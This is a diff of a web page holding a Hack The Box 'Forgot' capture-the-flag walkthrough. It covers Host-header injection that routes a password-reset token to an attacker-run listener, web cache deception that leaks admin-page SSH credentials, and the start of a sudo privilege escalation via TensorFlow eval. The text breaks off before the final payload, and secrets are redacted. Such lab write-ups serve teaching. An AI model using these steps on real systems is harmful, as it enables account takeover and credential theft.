@@ -1,19 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-14:I[484,[],"OutletBoundary"]
-15:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Forgot Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Host-header injection takes over a user account, web cache deception leaks SSH credentials from an administrator view, and unsafe TensorFlow expression handling in a sudo script executes a database-supplied payload as root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:09:33.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-forgot-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Forgot machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Forgot machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/forgot","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9","$La"]]}],"$Lb"]}]]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$L10",null,{"headings":[{"id":"overview","label":"Overview"},{"id":"phase-1-reconnaissance","label":"Phase 1: Reconnaissance"},{"id":"phase-2-host-header-injection","label":"Phase 2: Host Header Injection"},{"id":"phase-3-web-cache-deception","label":"Phase 3: Web Cache Deception"},{"id":"phase-4-initial-access","label":"Phase 4: Initial Access"},{"id":"phase-5-privilege-escalation","label":"Phase 5: Privilege Escalation"},{"id":"full-attack-chain-summary","label":"Full Attack Chain Summary"},{"id":"key-lessons","label":"Key Lessons"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/e1192deda99be41a564a10650e5eacae6a2828b4/HTB-Forgot.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit e1192deda99b",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Forgot, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/forgot","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-a:["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]
-11:T5a26,<p><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux (Ubuntu 20.04)<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.228.104<br><strong>User flag:</strong> <code>bbe7f96[redacted]6779a759</code><br><strong>Root flag:</strong> <code>1b78189[redacted]39911289e</code>  </p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Forgot Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Host-header injection takes over a user account, web cache deception leaks SSH credentials from an administrator view, and unsafe TensorFlow expression handling in a sudo script executes a database-supplied payload as root."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Forgot"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/forgot","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Medium"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-forgot-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Forgot machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Forgot machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/forgot","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T6269,<p><strong>Difficulty:</strong> Medium<br><strong>OS:</strong> Linux (Ubuntu 20.04)<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.228.104<br><strong>User flag:</strong> <code>bbe7f96[redacted]6779a759</code><br><strong>Root flag:</strong> <code>1b78189[redacted]39911289e</code>  </p>
 <hr>
 <h2 id="overview">Overview</h2>
 <p>Forgot is a Medium-difficulty Linux machine that chains together four distinct attack techniques:</p>
@@ -27,10 +28,10 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <hr>
 <h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
 <h3 id="step-1-port-scanning-with-nmap">Step 1: Port Scanning with nmap</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.228.104
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.228.104
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>22/tcp open  ssh
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>22/tcp open  ssh
 80/tcp open  http
 </code></pre>
 <p><strong>Reason:</strong><br>Start by identifying exposed services. <code>nmap</code> sends TCP SYN packets to every port (1-65535) and reports which ones respond. <code>-p-</code> means all ports, <code>--min-rate 10000</code> sends packets fast to avoid waiting forever.</p>
@@ -42,18 +43,18 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 </ul>
 <hr>
 <h3 id="step-2-fingerprinting-the-web-stack">Step 2: Fingerprinting the Web Stack</h3>
-<pre><code class="language-bash" data-language="bash">curl -s http://10.129.228.104 | grep -i 'robert\|dev\|fix'
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">curl -s http://10.129.228.104 | grep -i 'robert\|dev\|fix'
 </code></pre>
 <p><strong>But first - why look at the source code?</strong></p>
 <p>When you visit a website in a browser, you only see what the developer intended. But the raw HTML source often contains comments, debug notes, developer annotations, and accidentally leaked information that was never meant to be seen by users.</p>
 <p>Developers often leave comments like:</p>
-<pre><code class="language-html" data-language="html">&lt;!-- TODO: fix this before release --&gt;
+<pre tabindex="0" aria-label="html code or terminal block 4"><code class="language-html" data-language="html">&lt;!-- TODO: fix this before release --&gt;
 &lt;!-- Q1 release fix by robert-dev-367120 --&gt;
 </code></pre>
 <p>These are invisible in the browser but visible if you <code>curl</code> or "View Source".</p>
 <p><strong>Why we grep for <code>robert</code>:</strong><br>We're looking for anything that looks like a username. The writeup hinted at a <code>robert-dev-XXXXX</code> pattern. The number at the end is based on your HTB tunnel IP - HTB does this so players on shared labs don't interfere with each other.</p>
 <p><strong>Output:</strong></p>
-<pre><code class="language-html" data-language="html">&lt;!-- Q1 release fix by robert-dev-367120 --&gt;
+<pre tabindex="0" aria-label="html code or terminal block 5"><code class="language-html" data-language="html">&lt;!-- Q1 release fix by robert-dev-367120 --&gt;
 </code></pre>
 <p><strong>What we learned:</strong><br>A valid username: <code>robert-dev-367120</code>. This is valuable - the "Forgot Password" feature requires a valid username.</p>
 <p><br>Do not trust that a web page only contains what you see. read the source. Developers are human - they leave breadcrumbs.</p>
@@ -70,21 +71,21 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <p>The vulnerability here: <strong>how does the server know what domain to put in the link?</strong></p>
 <p>A lazy/insecure way is to take the <code>Host</code> HTTP header from the incoming request. That header is normally set by your browser to the domain you're visiting. But there's <strong>nothing stopping you from changing it</strong>.</p>
 <p>If the server uses <code>Host</code> to build the reset URL and you set <code>Host: 10.10.16.84</code>, the server will generate:</p>
-<pre><code>http://10.10.16.84/reset?token=REDACTED
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>http://10.10.16.84/reset?token=REDACTED
 </code></pre>
 <p>...and send that link to the user. When the user (or the bot) clicks it, the request - including the secret token - goes to <strong>your</strong> machine instead of the legitimate server.</p>
 <p>This is called <strong>Host Header Injection</strong>.</p>
 <hr>
 <h3 id="step-3-start-a-listener">Step 3: Start a Listener</h3>
 <p>On your Kali machine (needs port 80 open):</p>
-<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
 </code></pre>
 <p><strong>Why port 80:</strong><br>The reset link will be <code>http://</code> (not HTTPS), so it will connect to port 80. We run Python's built-in HTTP server to receive and log any incoming HTTP requests.</p>
 <p><strong>Why sudo:</strong><br>Ports below 1024 require root privileges on Linux.</p>
 <p><br>We're setting up a "catch" before we cast the line. We need our listener running before we trigger the password reset, otherwise the request arrives and nobody is home to record it.</p>
 <hr>
 <h3 id="step-4-trigger-the-password-reset-with-a-poisoned-host-header">Step 4: Trigger the Password Reset with a Poisoned Host Header</h3>
-<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.228.104/forgot?username=robert-dev-367120" -H "Host: 10.10.16.84"
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s "http://10.129.228.104/forgot?username=robert-dev-367120" -H "Host: 10.10.16.84"
 </code></pre>
 <p><strong>Breaking this down:</strong></p>
 <ul>
@@ -93,24 +94,24 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <li><code>-H "Host: 10.10.16.84"</code> : override the Host header with our attacker IP</li>
 </ul>
 <p><strong>What happens on the server (from the source code):</strong></p>
-<pre><code class="language-python" data-language="python">link = 'http://' + request.headers.get('host') + '/reset?token=' + token
+<pre tabindex="0" aria-label="python code or terminal block 9"><code class="language-python" data-language="python">link = 'http://' + request.headers.get('host') + '/reset?token=' + token
 </code></pre>
 <p>The server literally concatenates our <code>Host</code> header into the reset link. It stores that link in the database. The bot clicks it. Our server receives the request.</p>
 <p><strong>Wait ~60 seconds</strong> and watch the Python HTTP server terminal:</p>
-<pre><code>10.129.228.104 - - [09/Jun/2026 10:56:01] "GET /reset?token=REDACTED HTTP/1.1" 404 -
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>10.129.228.104 - - [09/Jun/2026 10:56:01] "GET /reset?token=REDACTED HTTP/1.1" 404 -
 </code></pre>
 <p>The token is in the URL. The 404 is fine - our Python server doesn't have that route, but we don't need it to. We just needed to log the token.</p>
 <p><br>The server trusts user-supplied input (the Host header) to build sensitive links. Do not trust input. validate. As attackers, we exploit the trust.</p>
 <hr>
 <h3 id="step-5-use-the-token-to-reset-the-password">Step 5: Use the Token to Reset the Password</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -X POST "http://10.129.228.104/reset?token=${RESET_TOKEN_URLENCODED}" \
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">curl -s -X POST "http://10.129.228.104/reset?token=${RESET_TOKEN_URLENCODED}" \
   --data "password=${NEW_PASSWORD}&amp;confirm=${NEW_PASSWORD}"
 </code></pre>
 <p><strong>Output:</strong> <code>success</code></p>
 <p>We now own robert's account with the password <code>REDACTED</code>.</p>
 <hr>
 <h3 id="step-6-log-in-and-save-the-session-cookie">Step 6: Log In and Save the Session Cookie</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -c cookies.txt -X POST "http://10.129.228.104/login" \
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">curl -s -c cookies.txt -X POST "http://10.129.228.104/login" \
   --data "username=robert-dev-367120&amp;password=REDACTED" -L
 </code></pre>
 <ul>
@@ -118,18 +119,18 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <li><code>-L</code> : follow redirects (the login likely redirects to <code>/home</code>)</li>
 </ul>
 <p>After login, <code>cookies.txt</code> contains:</p>
-<pre><code>session    52b92f5e-f4ef-49c1-9d98-83bdd0e38f4a
+<pre tabindex="0" aria-label="Code or terminal block 13"><code>session    52b92f5e-f4ef-49c1-9d98-83bdd0e38f4a
 </code></pre>
 <p>This session cookie authenticates us as robert for all future requests. We pass it with <code>-b cookies.txt</code>.</p>
 <hr>
 <h2 id="phase-3-web-cache-deception">Phase 3: Web Cache Deception</h2>
 <h3 id="background-what-is-varnish-and-why-does-it-matter">Background: What is Varnish and Why Does It Matter?</h3>
 <p><strong>Varnish</strong> is a reverse proxy / HTTP cache that sits in front of the real web server. Its job is to cache responses and serve them quickly without hitting the backend every time.</p>
-<pre><code>Client → Varnish (port 80) → Flask app (port 8080)
+<pre tabindex="0" aria-label="Code or terminal block 14"><code>Client → Varnish (port 80) → Flask app (port 8080)
 </code></pre>
 <p>When Varnish has a cached response for a URL, it serves that cached version to <strong>any</strong> client requesting that URL - regardless of who they are or whether they're logged in.</p>
 <p><strong>The Varnish config on this machine:</strong></p>
-<pre><code class="language-vcl" data-language="vcl">sub vcl_recv {
+<pre tabindex="0" aria-label="vcl code or terminal block 15"><code class="language-vcl" data-language="vcl">sub vcl_recv {
     if (req.url ~ "/static") {
         return (hash);   # cache this request
     }
@@ -142,7 +143,7 @@ a:["$","div","source-context-2",{"className":"article-review-note article-review
 <li><code>/tickets/static/0xdf</code> → also cached</li>
 </ul>
 <p><strong>The Flask app has wildcard routes:</strong></p>
-<pre><code class="language-python" data-language="python">@app.route('/admin_tickets', defaults={'path':''})
+<pre tabindex="0" aria-label="python code or terminal block 16"><code class="language-python" data-language="python">@app.route('/admin_tickets', defaults={'path':''})
 @app.route('/admin_tickets/&lt;path:path&gt;')
 def admin(path):
     # same page regardless of what comes after /admin_tickets/
@@ -162,7 +163,7 @@ def admin(path):
 <p><strong>Use a fresh URL that you have never visited.</strong></p>
 <hr>
 <h3 id="step-7-check-what-ticket-issues-are-available">Step 7: Check What Ticket Issues Are Available</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -b cookies.txt "http://10.129.228.104/escalate" | grep -i 'option\|value'
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">curl -s -b cookies.txt "http://10.129.228.104/escalate" | grep -i 'option\|value'
 </code></pre>
 <p>The escalation form requires a valid issue value (it's a dropdown, not a free-text field). We found:</p>
 <ul>
@@ -173,7 +174,7 @@ def admin(path):
 </ul>
 <hr>
 <h3 id="step-8-submit-the-malicious-link-to-the-admin-bot">Step 8: Submit the Malicious Link to the Admin Bot</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -b cookies.txt -X POST "http://10.129.228.104/escalate" \
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">curl -s -b cookies.txt -X POST "http://10.129.228.104/escalate" \
   --data-urlencode "issue=Pending PR Merge" \
   --data-urlencode "link=http://10.129.228.104/admin_tickets/static/xyz456" \
   --data-urlencode "reason=test" \
@@ -184,10 +185,10 @@ def admin(path):
 <p><strong>Wait 3 full minutes. Do not visit the URL yourself.</strong></p>
 <hr>
 <h3 id="step-9-retrieve-the-cached-admin-page">Step 9: Retrieve the Cached Admin Page</h3>
-<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.228.104/admin_tickets/static/xyz456"
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">curl -s "http://10.129.228.104/admin_tickets/static/xyz456"
 </code></pre>
 <p><strong>Output (truncated):</strong></p>
-<pre><code class="language-html" data-language="html">&lt;div class="icons"&gt;Logged in as Admin&lt;/div&gt;
+<pre tabindex="0" aria-label="html code or terminal block 20"><code class="language-html" data-language="html">&lt;div class="icons"&gt;Logged in as Admin&lt;/div&gt;
 ...
 &lt;td&gt;SSH Credentials are not working for Jenkins Slave machine&lt;/td&gt;
 &lt;td&gt;Diego (Devops Lead)&lt;/td&gt;
@@ -199,20 +200,20 @@ def admin(path):
 <hr>
 <h2 id="phase-4-initial-access">Phase 4: Initial Access</h2>
 <h3 id="step-10-ssh-as-diego">Step 10: SSH as diego</h3>
-<pre><code class="language-bash" data-language="bash">ssh diego@10.129.228.104
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">ssh diego@10.129.228.104
 # password: REDACTED
 </code></pre>
-<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">cat ~/user.txt
 # bbe7f9[redacted]06779a759
 </code></pre>
 <p>User flag captured.</p>
 <hr>
 <h2 id="phase-5-privilege-escalation">Phase 5: Privilege Escalation</h2>
 <h3 id="step-11-check-sudo-privileges">Step 11: Check Sudo Privileges</h3>
-<pre><code class="language-bash" data-language="bash">sudo -l
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>User diego may run the following commands on forgot:
+<pre tabindex="0" aria-label="Code or terminal block 24"><code>User diego may run the following commands on forgot:
     (ALL) NOPASSWD: /opt/security/ml_security.py
 </code></pre>
 <p><strong>What this means:</strong><br>Diego can run <code>/opt/security/ml_security.py</code> as <strong>root</strong> without a password. This is the most important line on the box.</p>
@@ -222,19 +223,19 @@ def admin(path):
 <p>Reading the script, here's what it does:</p>
 <ol>
 <li><strong>Loads ML models</strong> from <code>/opt/security/lib/</code> (scikit-learn classifiers + Doc2Vec)</li>
-<li><strong>Reads data from MySQL:</strong><pre><code class="language-python" data-language="python">cursor.execute('select reason from escalate')
+<li><strong>Reads data from MySQL:</strong><pre tabindex="0" aria-label="python code or terminal block 25"><code class="language-python" data-language="python">cursor.execute('select reason from escalate')
 </code></pre>
 It fetches every <code>reason</code> from the <code>escalate</code> table</li>
 <li><strong>Scores each entry</strong> using 6 ML models to determine if it looks like XSS</li>
-<li><strong>If score ≥ 0.5</strong>, it calls:<pre><code class="language-python" data-language="python">preprocess_input_exprs_arg_string(data[i], safe=False)
+<li><strong>If score ≥ 0.5</strong>, it calls:<pre tabindex="0" aria-label="python code or terminal block 26"><code class="language-python" data-language="python">preprocess_input_exprs_arg_string(data[i], safe=False)
 </code></pre>
 </li>
 </ol>
 <p><strong>The vulnerable function:</strong><br><code>preprocess_input_exprs_arg_string</code> is imported from TensorFlow:</p>
-<pre><code class="language-python" data-language="python">from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
+<pre tabindex="0" aria-label="python code or terminal block 27"><code class="language-python" data-language="python">from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
 </code></pre>
 <p>This is <strong>CVE-2022-29216</strong>. When called with <code>safe=False</code>, it passes user input to Python's <code>eval()</code>:</p>
-<pre><code class="language-python" data-language="python">input_dict[input_key] = eval(expr)  # the vulnerability
+<pre tabindex="0" aria-label="python code or terminal block 28"><code class="language-python" data-language="python">input_dict[input_key] = eval(expr)  # the vulnerability
 </code></pre>
 <p><code>eval()</code> executes arbitrary Python code. Since the script runs as root via sudo, any code we inject runs as root.</p>
 <hr>
@@ -245,10 +246,10 @@ It fetches every <code>reason</code> from the <code>escalate</code> table</li>
 <li><strong>Contains valid Python for <code>eval()</code></strong> : so it executes our command</li>
 </ol>
